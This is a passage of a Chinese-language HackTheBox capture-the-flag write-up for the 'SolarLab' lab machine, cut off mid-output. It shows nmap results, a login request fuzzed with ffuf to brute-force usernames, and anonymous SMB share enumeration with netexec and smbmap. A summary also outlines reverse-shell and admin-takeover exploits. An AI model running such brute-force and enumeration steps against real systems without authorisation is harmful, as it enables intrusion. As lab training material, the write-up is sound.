@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P SolarLab總結：首先通過爆破用戶名獲得了一個有效的用戶名，接著利用空用戶連接 SMB 協議，成功訪問到 Documents 目錄，下載了包含密碼的 Excel 文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - SolarLab">
+<meta property="og:url" content="https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P SolarLab總結：首先通過爆破用戶名獲得了一個有效的用戶名，接著利用空用戶連接 SMB 協議，成功訪問到 Documents 目錄，下載了包含密碼的 Excel 文">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512031001-pejyyap.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512032602-abz3qyw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512033025-w9b59gr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512220722-mqmu8au.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512220850-sulo52g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512221401-8maf9ht.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512221308-qfjc3cl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512221314-8la815p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512045943-92mifyw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512045449-x8uhs67.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512184648-zaissza.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512184742-i8xsggb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512054921-cxivik5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512185146-v4mnea2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512185340-aanjl5f.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512181753-uuxk8k8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512181823-jwn1uyi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512182014-8rmon4p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512182348-0hzzlnr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512182445-0obj6kf.png">
+<meta property="article:published_time" content="2024-05-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-22T00:04:22.470Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512031001-pejyyap.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - SolarLab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/25/2024-htb-machine/20-MagicGardens/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/05/2024-htb-machine/18-Mailing/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&text=HackTheBox - Machine - SolarLab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&is_video=false&description=HackTheBox - Machine - SolarLab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - SolarLab&body=Check out this article: https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&title=HackTheBox - Machine - SolarLab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&name=HackTheBox - Machine - SolarLab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/05/12/2024-htb-machine/19-SolarLab/&t=HackTheBox - Machine - SolarLab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - SolarLab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-11T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-05-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="SolarLab"><a href="#SolarLab" class="headerlink" title="SolarLab"></a>SolarLab</h1><p>總結：首先通過爆破用戶名獲得了一個有效的用戶名，接著利用空用戶連接 SMB 協議，成功訪問到 Documents 目錄，下載了包含密碼的 Excel 文件。隨後，使用這些密碼進行爆破，最終獲得了用戶帳號和密碼，成功登入系統。接下來，生成了一個 PDF 文件，並發現其使用了 ReportLab PDF Library，進一步查找相關漏洞後，發現了 CVE-2023-33733 的利用方式。雖然最初的嘗試受到字數限制的影響，但在找到一個無限制的輸入框後，成功利用了該漏洞，獲得了反向 Shell。進一步調查後，發現系統中運行著 Openfire 服務，並通過查找其管理頁面，發現了 CVE-2023-32315 的漏洞。利用該漏洞創建了管理員賬號後，便可以上傳管理工具插件，獲得 Web Shell。接著，通過分析數據庫，尋找加密密碼，並最終找到了解密工具，成功獲得了管理員的密碼，隨後進行了進一步的操作。</p>
+<h2 id="0x1-Nmap-scan"><a href="#0x1-Nmap-scan" class="headerlink" title="0x1 Nmap scan"></a>0x1 Nmap scan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">80/tcp   open  http          syn-ack ttl 127 nginx 1.24.0</span><br><span class="line">|_http-title: SolarLab Instant Messenger</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">6791/tcp open  http          syn-ack ttl 127 nginx 1.24.0</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/</span><br><span class="line">7680/tcp open  tcpwrapped    syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-web-80"><a href="#0x2-web-80" class="headerlink" title="0x2 web - 80"></a>0x2 web - 80</h2><p>玩了一下，裏面什麽也沒有，不過有三個人的名字：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Alexander Knight</span><br><span class="line">Claudia Springer</span><br><span class="line">Blake Byte</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x3-ReportHub-6791"><a href="#0x3-ReportHub-6791" class="headerlink" title="0x3 ReportHub - 6791"></a>0x3 ReportHub - 6791</h2><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512031001-pejyyap.png" alt="image">​</p>
+<p>因爲不知道用戶名，而且用戶名是可以爆破的，這就讓我可以嘗試爆破下用戶名，所以用 username-anarchy 做了一個字典，然後使用ffuf爆破一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span>  user.req  </span><br><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: report.solarlab.htb:6791</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line">Origin: http://report.solarlab.htb:6791</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://report.solarlab.htb:6791/login</span><br><span class="line">Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.Zj_CeA.un_9L4YffmSiXLx2b7Ghq2MCdU0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=FUZZ&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -request user.req -request-proto http -w guessUsername.txt -fs 2133</span><br><span class="line">[Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 170ms]</span><br><span class="line">    * FUZZ: alexanderk</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 175ms]</span><br><span class="line">    * FUZZ: claudias</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 152ms]</span><br><span class="line">    * FUZZ: blakeb</span><br></pre></td></tr></table></figure>
+
+<p>得到個有效的用戶名，可惜不知道密碼。</p>
+<h2 id="0x4-smb-Find-Valid-Users"><a href="#0x4-smb-Find-Valid-Users" class="headerlink" title="0x4 smb - Find Valid Users"></a>0x4 smb - Find Valid Users</h2><p>smb 允許空用戶進行鏈接，所以看到裏面有一個 <code>Documents</code>​ 目錄</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.129.231.39 -u <span class="string">&#x27;anonymouos&#x27;</span> -p <span class="string">&#x27;&#x27;</span>  --shares                          </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)                   </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [+] solarlab\anonymouos:          </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [*] Enumerated shares                                                                                                           </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         Share           Permissions     Remark                                                                                          </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         -----           -----------     ------                                                                                          </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         ADMIN$                          Remote Admin                                                                                    </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         C$                              Default share                                                                                   </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         Documents       READ              </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         IPC$            READ            Remote IPC</span><br></pre></td></tr></table></figure>
+
+<p>然後用smbmap遞歸搜索下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.129.231.39 -u <span class="string">&#x27;anonymouos&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --depth 10 -r</span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line">     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB</span><br><span class="line">[*] Established 1 SMB session(s)</span><br><span class="line"></span><br><span class="line">[+] IP: 10.129.231.39:445       Name: solarlab.htb              Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        Documents                                               READ ONLY</span><br><span class="line">        ./Documents</span><br><span class="line">        dw--w--w--                0 Fri Apr 26 22:47:14 2024    .</span><br><span class="line">        dw--w--w--                0 Fri Apr 26 22:47:14 2024    ..</span><br><span class="line">        dr--r--r--                0 Fri Apr 26 22:41:57 2024    concepts</span><br><span class="line">        fr--r--r--              278 Fri Nov 17 20:34:54 2023    desktop.ini</span><br><span class="line">        fr--r--r--            12793 Fri Nov 17 20:34:54 2023    details-file.xlsx</span><br><span class="line">        dr--r--r--                0 Fri Nov 17 03:36:51 2023    My Music</span><br><span class="line">        dr--r--r--                0 Fri Nov 17 03:36:51 2023    My Pictures</span><br><span class="line">        dr--r--r--                0 Fri Nov 17 03:36:51 2023    My Videos</span><br><span class="line">        fr--r--r--            37194 Fri Apr 26 22:44:18 2024    old_leave_request_form.docx</span><br><span class="line">        ./Documents/concepts</span><br><span class="line">        dr--r--r--                0 Fri Apr 26 22:41:57 2024    .</span><br><span class="line">        dr--r--r--                0 Fri Apr 26 22:41:57 2024    ..</span><br><span class="line">        fr--r--r--           161337 Fri Apr 26 22:41:33 2024    Training-Request-Form.docx</span><br><span class="line">        fr--r--r--            30953 Fri Apr 26 22:41:58 2024    Travel-Request-Sample.docx</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        ./IPC$</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    InitShutdown</span><br><span class="line">        fr--r--r--                4 Mon Jan  1 08:06:00 1601    lsass</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    ntsvcs</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    scerpc</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    Winsock2\CatalogChangeListener-2a4-0</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    Winsock2\CatalogChangeListener-380-0</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    epmapper</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    Winsock2\CatalogChangeListener-204-0</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    LSM_API_service</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    Winsock2\CatalogChangeListener-3b4-0</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    eventlog</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    Winsock2\CatalogChangeListener-2bc-0</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    atsvc</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    Winsock2\CatalogChangeListener-59c-0</span><br><span class="line">        fr--r--r--                4 Mon Jan  1 08:06:00 1601    wkssvc</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    trkwks</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    tapsrv</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    Winsock2\CatalogChangeListener-290-0</span><br><span class="line">        fr--r--r--                4 Mon Jan  1 08:06:00 1601    srvsvc</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    vgauth-service</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    ROUTER</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    MsFteWds</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    SearchTextHarvester</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    PSHost.133599276671265331.2436.DefaultAppDomain.powershell</span><br><span class="line">        fr--r--r--                1 Mon Jan  1 08:06:00 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">        fr--r--r--                3 Mon Jan  1 08:06:00 1601    